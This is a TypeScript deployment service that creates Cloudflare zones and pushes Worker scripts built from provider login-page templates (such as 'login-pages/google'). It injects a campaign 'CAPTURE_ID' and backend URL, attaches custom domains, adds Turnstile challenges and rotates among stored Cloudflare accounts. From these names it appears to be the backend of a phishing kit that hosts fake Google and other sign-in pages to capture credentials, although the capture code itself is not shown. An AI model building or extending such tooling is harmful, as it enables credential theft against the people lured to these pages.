import prisma from '../config/database';
import { logger } from '../utils/logger.util';
import { createCloudflareClient } from './cloudflare/cloudflare-client';
import { decryptToken } from '../utils/cloudflare-rotation';
import fs from 'fs';
import path from 'path';

export class DeploymentService {
  /**
   * Get Cloudflare account for deployment
   */
  private async getCloudflareAccount() {
    const account = await prisma.cloudflareAccount.findFirst({
      where: { status: 'ACTIVE' },
      orderBy: { zonesCount: 'asc' }, // Load balance
    });

    if (!account) {
      throw new Error('No active Cloudflare account available');
    }

    return account;
  }

  /**
   * Deploy Cloudflare Workers Page for a domain
   * Creates Worker script, attaches custom domain, sets Turnstile env vars
   * @param domainId - Domain database ID
   * @returns { cfWorkerName, cfRootCustomDomainId }
   */
  async deployWorkerForDomain(domainId: string): Promise<{
    cfWorkerName: string;
    cfRootCustomDomainId: string;
  }> {
    const domain = await prisma.domain.findUnique({
      where: { id: domainId },
      include: {
        CloudflareAccount: true,
        activeCampaign: { select: { captureId: true } },
      },
    });

    if (!domain) {
      throw new Error('Domain not found');
    }

    if (!domain.cloudflareZoneId || !domain.CloudflareAccount) {
      throw new Error('Domain must have Cloudflare zone and account configured');
    }

    if (domain.cfWorkerName) {
      logger.info(`Domain ${domain.name} already has Worker: ${domain.cfWorkerName} - redeploying to update configuration...`);
    } else {
      logger.info(`Deploying Workers Page for domain: ${domain.name}`);
    }

    const workerName = domain.cfWorkerName || `fiona-${domain.name.replace(/\./g, '-')}`;

    // Decrypt API token from database
    const apiToken = decryptToken(domain.CloudflareAccount.apiToken);
    
    const cfClient = createCloudflareClient(
      apiToken,
      domain.CloudflareAccount.accountId
    );

    // Step 1: Read worker.js template
    const workerPath = path.resolve(__dirname, '../../login-pages/google/worker.js');
    let workerTemplate = '';
    try {
      workerTemplate = fs.readFileSync(workerPath, 'utf-8');
    } catch (error) {
      logger.error('Could not read worker.js:', error);
      throw new Error('Worker template not found');
    }

    // Step 2: Replace __BACKEND_URL__ and {{CAPTURE_ID}} with actual values
    const backendUrl = process.env.BACKEND_URL || 'http://localhost:8000';
    const captureId = (domain as any).activeCampaign?.captureId || '';
    const workerScript = workerTemplate
      .replace(/__BACKEND_URL__/g, backendUrl)
      .replace(/\{\{CAPTURE_ID\}\}/g, captureId);
    logger.info(`[DEPLOY] CAPTURE_ID="${captureId}" injected for ${domain.name}`);

    // Step 3: Deploy/Update Worker script to Cloudflare
    // Note: Turnstile keys are fetched dynamically by Worker from backend /api/domain/config
    logger.info(`Deploying Worker script: ${workerName}`);
    await cfClient.deployWorkerScript(
      domain.CloudflareAccount.accountId,
      workerScript,
      workerName
    );

    // Step 5: Attach root domain as Custom Domain (only if not already attached)
    let cfRootCustomDomainId = domain.cfRootCustomDomainId;
    
    if (!cfRootCustomDomainId) {
      logger.info(`Attaching custom domain: ${domain.name} → ${workerName}`);
      const result = await cfClient.attachWorkerDomain({
        accountId: domain.CloudflareAccount.accountId,
        workerName,
        hostname: domain.name,
        zoneId: domain.cloudflareZoneId,
        zoneName: domain.name,
      });
      cfRootCustomDomainId = result.id;
    } else {
      logger.info(`Custom domain already attached: ${domain.name}`);
    }

    // Step 6: Update domain record in database
    await prisma.domain.update({
      where: { id: domainId },
      data: {
        cfWorkerName: workerName,
        cfRootCustomDomainId,
      },
    });

    logger.success(`Workers Page deployed successfully: ${domain.name} → ${workerName}`);

    return { cfWorkerName: workerName, cfRootCustomDomainId };
  }

  /**
   * Deploy domain with Cloudflare (Custom Domains architecture)
   */
  async deployDomain(data: {
    userId: string;
    campaignId: string;
    domain: string;
    subdomain?: string;
    isCustomDomain: boolean;
  }) {
    let deployment;

    try {
      // Create deployment record
      deployment = await prisma.deployment.create({
        data: {
          userId: data.userId,
          campaignId: data.campaignId,
          domain: data.domain,
          subdomain: data.subdomain,
          isCustomDomain: data.isCustomDomain,
          deploymentStatus: 'DEPLOYING',
          dnsStatus: 'PENDING',
          sslStatus: 'PENDING',
        },
      });

      logger.info(`Starting deployment for ${data.domain} (${deployment.id})`);

      // Get Cloudflare account
      const cfAccount = await this.getCloudflareAccount();
      const apiToken = decryptToken(cfAccount.apiToken);
      const cfClient = createCloudflareClient(apiToken, cfAccount.accountId);

      // Step 1: Create Cloudflare Zone
      logger.info(`Creating Cloudflare zone for ${data.domain}...`);
      const zoneResponse = await cfClient.createZone(data.domain);
      const zoneId = zoneResponse.result.id;

      await prisma.deployment.update({
        where: { id: deployment.id },
        data: {
          cloudflareZoneId: zoneId,
          dnsStatus: 'ACTIVE',
        },
      });

      logger.success(`Zone created: ${zoneId}`);

      // Step 2: Create Turnstile widget and save keys to DB
      logger.info('Creating Turnstile widget...');
      let turnstileSiteKey: string | null = null;
      let turnstileSecretKey: string | null = null;

      try {
        const turnstileResult = await cfClient.createTurnstileWidget({
          accountId: cfAccount.accountId,
          name: data.domain,
          domains: [data.domain],
          mode: 'managed',
        });

        turnstileSiteKey = turnstileResult.sitekey;
        turnstileSecretKey = turnstileResult.secret;
      } catch (error) {
        logger.warn('Turnstile widget creation failed (non-fatal):', error);
      }

      // Step 3: Update domain with Turnstile keys
      await prisma.domain.update({
        where: { name: data.domain },
        data: {
          turnstileSitekey: turnstileSiteKey,
          turnstileSecretKey: turnstileSecretKey,
        },
      });

      // Step 4: Read worker.js template and inject BACKEND_URL
      logger.info('Preparing worker script...');
      const campaign = await prisma.campaign.findUnique({
        where: { id: data.campaignId },
      });

      if (!campaign) {
        throw new Error('Campaign not found');
      }

      const workerPath = path.resolve(
        __dirname,
        '../../login-pages',
        campaign.provider.toLowerCase(),
        'worker.js'
      );

      let workerTemplate = '';
      try {
        workerTemplate = fs.readFileSync(workerPath, 'utf-8');
      } catch (error) {
        logger.error(`Could not read worker.js for ${campaign.provider}:`, error);
        throw new Error(`Worker template not found for provider: ${campaign.provider}`);
      }

      // Inject BACKEND_URL (string replacement - NO CF env bindings)
      const backendUrl = process.env.BACKEND_URL || 'http://localhost:8000';
      const workerScript = workerTemplate.replace(/__BACKEND_URL__/g, backendUrl);

      // Step 5: Upload worker - Cloudflare assigns UUID name
      logger.info('Uploading worker script...');
      const { workerName } = await cfClient.deployWorkerScript(cfAccount.accountId, workerScript);

      logger.success(`Worker deployed with CF-assigned name: ${workerName}`);

      // Save CF-assigned worker name to domain
      await prisma.domain.update({
        where: { name: data.domain },
        data: {
          cfWorkerName: workerName,
        },
      });

      // Step 6: Attach root domain as Custom Domain
      logger.info(`Attaching root domain as Custom Domain: ${data.domain}`);
      const { id: cfRootCustomDomainId } = await cfClient.attachWorkerDomain({
        accountId: cfAccount.accountId,
        workerName,
        hostname: data.domain,
        zoneId,
        zoneName: data.domain,
      });

      // Save Custom Domain ID to domain
      await prisma.domain.update({
        where: { name: data.domain },
        data: {
          cfRootCustomDomainId,
        },
      });

      logger.success('Root domain attached as Custom Domain');

      // Step 7: Configure SSL (Full mode)
      logger.info('Configuring SSL...');
      await cfClient.updateSslMode(zoneId, 'full');

      await prisma.deployment.update({
        where: { id: deployment.id },
        data: {
          sslStatus: 'ACTIVE',
        },
      });

      logger.success('SSL configured');

      // Step 8: Mark deployment as complete
      const deployedUrl = `https://${data.domain}`;

      await prisma.deployment.update({
        where: { id: deployment.id },
        data: {
          deploymentStatus: 'DEPLOYED',
          deployedUrl,
          deployedAt: new Date(),
          lastCheckedAt: new Date(),
        },
      });

      // Update campaign deployment count
      await prisma.campaign.update({
        where: { id: data.campaignId },
        data: {
          deploymentCount: { increment: 1 },
        },
      });

      // Update Cloudflare account last used timestamp
      await prisma.cloudflareAccount.update({
        where: { id: cfAccount.id },
        data: {
          lastUsedAt: new Date(),
        },
      });

      logger.success(`Deployment complete! ${deployedUrl}`);

      return {
        success: true,
        deployment: await prisma.deployment.findUnique({
          where: { id: deployment.id },
          include: {
            campaign: {
              select: {
                name: true,
                captureId: true,
                provider: true,
              },
            },
          },
        }),
      };
    } catch (error: any) {
      logger.error('Deployment error:', error.message);

      // Update deployment with error
      if (deployment) {
        await prisma.deployment.update({
          where: { id: deployment.id },
          data: {
            deploymentStatus: 'FAILED',
            errorLog: error.message,
            failureReason: error.message,
            retryCount: { increment: 1 },
          },
        });
      }

      throw error;
    }
  }


  /**
   * Get deployment by ID
   */
  async getDeploymentById(deploymentId: string, userId?: string, isAdmin: boolean = false) {
    try {
      const deployment = await prisma.deployment.findUnique({
        where: { id: deploymentId },
        include: {
            campaign: {
              select: {
                name: true,
                captureId: true,
                provider: true,
                User: {
                  select: {
                    email: true,
                    fullName: true,
                  },
                },
              },
            },
        },
      });

      if (!deployment) {
        throw new Error('Deployment not found');
      }

      // Check ownership
      if (!isAdmin && userId && deployment.userId !== userId) {
        throw new Error('Access denied - not deployment owner');
      }

      return {
        success: true,
        deployment,
      };
    } catch (error: any) {
      logger.error('Get deployment error:', error.message);
      throw error;
    }
  }

  /**
   * Get all deployments for user
   */
  async getUserDeployments(userId: string, isAdmin: boolean = false) {
    try {
      const where = isAdmin ? {} : { userId };

      const deployments = await prisma.deployment.findMany({
        where,
        include: {
            campaign: {
              select: {
                name: true,
                captureId: true,
                provider: true,
                User: {
                  select: {
                    email: true,
                    fullName: true,
                  },
                },
              },
            },
        },
        orderBy: { createdAt: 'desc' },
      });

      return {
        success: true,
        deployments,
        total: deployments.length,
      };
    } catch (error: any) {
      logger.error('Get user deployments error:', error.message);
      throw error;
    }
  }

  /**
   * Delete deployment
   */
  async deleteDeployment(deploymentId: string, userId: string, isAdmin: boolean = false) {
    try {
      const deployment = await prisma.deployment.findUnique({
        where: { id: deploymentId },
      });

      if (!deployment) {
        throw new Error('Deployment not found');
      }

      // Check ownership
      if (!isAdmin && deployment.userId !== userId) {
        throw new Error('Access denied - not deployment owner');
      }

      // Cleanup Cloudflare resources if deployed
      if (deployment.cloudflareZoneId) {
        try {
          const cfAccount = await this.getCloudflareAccount();
          const apiToken = decryptToken(cfAccount.apiToken);
          const cfClient = createCloudflareClient(apiToken, cfAccount.accountId);

          // Delete zone (this also deletes DNS records and routes)
          await cfClient.deleteZone(deployment.cloudflareZoneId);
          logger.success(`Cloudflare zone deleted: ${deployment.cloudflareZoneId}`);

          // Delete worker if exists
          if (deployment.cloudflareWorkerId) {
            await cfClient.deleteWorker(deployment.cloudflareWorkerId);
            logger.success(`Worker deleted: ${deployment.cloudflareWorkerId}`);
          }
        } catch (error) {
          logger.warn('Failed to cleanup Cloudflare resources:', error);
          // Continue with deletion even if Cloudflare cleanup fails
        }
      }

      // Delete deployment record
      await prisma.deployment.delete({
        where: { id: deploymentId },
      });

      logger.success(`Deployment deleted: ${deployment.domain}`);

      return {
        success: true,
        message: 'Deployment deleted successfully',
      };
    } catch (error: any) {
      logger.error('Delete deployment error:', error.message);
      throw error;
    }
  }
}

const deploymentService = new DeploymentService();
export { deploymentService };
export default deploymentService;
